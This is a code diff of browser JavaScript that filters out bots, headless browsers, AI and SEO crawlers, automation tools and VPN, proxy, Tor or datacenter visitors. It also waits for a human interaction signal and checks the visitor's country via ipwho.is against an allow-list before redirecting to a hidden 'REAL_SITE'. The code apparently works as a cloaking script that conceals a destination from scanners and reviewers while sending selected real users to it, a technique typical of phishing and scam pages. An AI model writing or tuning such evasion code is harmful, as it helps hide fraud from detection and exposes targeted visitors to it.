@@ -666,96 +666,53 @@ const ALLOWED_COUNTRIES = ['GB', 'US', 'CA', 'AU', 'NZ'];
 
 (async () => {
   const ua = navigator.userAgent || '';
+
+  // 1. Bot UA check
   const BAD_UA = [
-    /bot/i,/crawl/i,/spider/i,/slurp/i,/scrape/i,/fetch/i,
-    /facebookexternalhit/i,/twitterbot/i,/linkedinbot/i,/whatsapp/i,
+    /bot/i,/crawl/i,/spider/i,/slurp/i,/scrape/i,
+    /facebookexternalhit/i,/twitterbot/i,/linkedinbot/i,
     /applebot/i,/headlesschrome/i,/phantomjs/i,/selenium/i,
     /puppeteer/i,/playwright/i,/python/i,/curl/i,/wget/i,
-    /ahrefsbot/i,/semrushbot/i,/dotbot/i,/mj12bot/i,/petalbot/i,
-    /yandexbot/i,/baiduspider/i,/gptbot/i,/ccbot/i,/claudebot/i,
-    /bytespider/i,/cohere/i,/anthropic/i,/openai/i,/perplexity/i,
-    /go-http-client/i,/java\//i,/okhttp/i,/axios/i,/scrapy/i,
+    /ahrefsbot/i,/semrushbot/i,/gptbot/i,/ccbot/i,/claudebot/i,
+    /bytespider/i,/go-http-client/i,/java\//i,/okhttp/i,/scrapy/i,
   ];
   if (!ua || ua.length < 20)        return;
   if (BAD_UA.some(p => p.test(ua))) return;
-  if (navigator.webdriver)                                       return;
-  if (!navigator.language)                                       return;
-  if ((navigator.languages||[]).length === 0)                    return;
-  if (/chrome/i.test(ua) && !window.chrome)                     return;
-  if (navigator.plugins?.length === 0 && !/firefox/i.test(ua))  return;
-  if (screen.width === 0 || screen.height === 0)                 return;
 
-  let human = false;
-  ['mousemove','mousedown','touchstart','scroll','keydown','pointerdown','pointerup','click']
-    .forEach(e => window.addEventListener(e, () => human = true, { once:true, passive:true }));
+  // 2. Headless browser tells
+  if (navigator.webdriver)                                      return;
+  if (!navigator.language)                                      return;
+  if ((navigator.languages||[]).length === 0)                   return;
+  if (/chrome/i.test(ua) && !window.chrome)                    return;
+  if (navigator.plugins?.length === 0 && !/firefox/i.test(ua)) return;
+  if (screen.width === 0 || screen.height === 0)                return;
 
-  // Also count as human if page has been visible for 2s (handles fast mobile scrollers)
-  const visibleTimer = new Promise(r => setTimeout(() => { human = true; r(); }, 2000));
+  // 3. Human signal — any interaction OR 2.5s on page (covers mobile users)
+  await new Promise(resolve => {
+    let done = false;
+    const finish = () => { if (!done) { done = true; resolve(); } };
+    ['mousemove','mousedown','touchstart','touchend','scroll',
+     'keydown','pointerdown','click'].forEach(e =>
+      window.addEventListener(e, finish, { once: true, passive: true })
+    );
+    setTimeout(finish, 2500);
+  });
 
-  await Promise.race([
-    visibleTimer,
-    new Promise(resolve => {
-      const t = setInterval(() => { if (human) { clearInterval(t); resolve(); } }, 80);
-      setTimeout(() => { clearInterval(t); resolve(); }, 4000);
-    })
-  ]);
-  if (!human) return;
+  // 4. Single reliable geo + VPN check via ipwho.is
+  try {
+    const res = await fetch('https://ipwho.is/', {
+      signal: AbortSignal.timeout(7000)
+    });
+    const d = await res.json();
 
-  // Geo + VPN check — ALL three APIs must be checked
-  // We require at least 2 clean signals before passing anyone through
-  // If ANY api flags VPN/proxy/hosting — block immediately, no fallback
+    if (!d.success)   return; // bad response
+    if (d.type === 'vpn' || d.type === 'proxy' || d.type === 'tor' ||
+        d.type === 'hosting' || d.type === 'datacenter') return; // VPN/proxy
+    if (!ALLOWED_COUNTRIES.includes(d.country_code))     return; // wrong country
 
-  const results = await Promise.allSettled([
+  } catch { return; } // timeout or network error — stay safe
 
-    // 1. ipwho.is — checks connection type
-    fetch('https://ipwho.is/', { signal: AbortSignal.timeout(6000) })
-      .then(r => r.json())
-      .then(d => {
-        if (!d.success) return null;
-        const isClean = d.type === 'isp' || d.type === 'residential' || d.type === 'mobile';
-        if (!isClean) throw new Error('vpn'); // block immediately
-        return d.country_code;
-      }),
-
-    // 2. proxycheck.io — dedicated VPN/proxy database, no key needed for basic use
-    fetch('https://proxycheck.io/v2/?vpn=1&asn=1', { signal: AbortSignal.timeout(6000) })
-      .then(r => r.json())
-      .then(d => {
-        // response format: { "status":"ok", "YOUR_IP": { "proxy":"yes/no", "type":"VPN/..." } }
-        const ipData = Object.values(d).find(v => typeof v === 'object' && 'proxy' in v);
-        if (!ipData) return null;
-        if (ipData.proxy === 'yes') throw new Error('vpn'); // block immediately
-        return ipData.country ? ipData.isocode : null;
-      }),
-
-    // 3. ipapi.co — clean fallback
-    fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(6000) })
-      .then(r => r.json())
-      .then(d => {
-        if (d.error) return null;
-        return d.country_code;
-      }),
-
-  ]);
-
-  // If ANY check explicitly threw 'vpn' — hard block, done
-  const wasVpnFlagged = results.some(r => r.status === 'rejected' && r.reason?.message === 'vpn');
-  if (wasVpnFlagged) return;
-
-  // Collect country codes from successful checks
-  const countryCodes = results
-    .filter(r => r.status === 'fulfilled' && r.value)
-    .map(r => r.value);
-
-  // Need at least 2 clean country signals
-  if (countryCodes.length < 2) return;
-
-  // All returned country codes must agree and be in allowed list
-  const allSameCountry = countryCodes.every(cc => cc === countryCodes[0]);
-  if (!allSameCountry) return; // mismatched = suspicious
-  if (!ALLOWED_COUNTRIES.includes(countryCodes[0])) return;
-
-  await new Promise(r => setTimeout(r, 100 + Math.random() * 400));
+  // 5. All good — redirect
   window.location.replace(REAL_SITE);
 })();
 
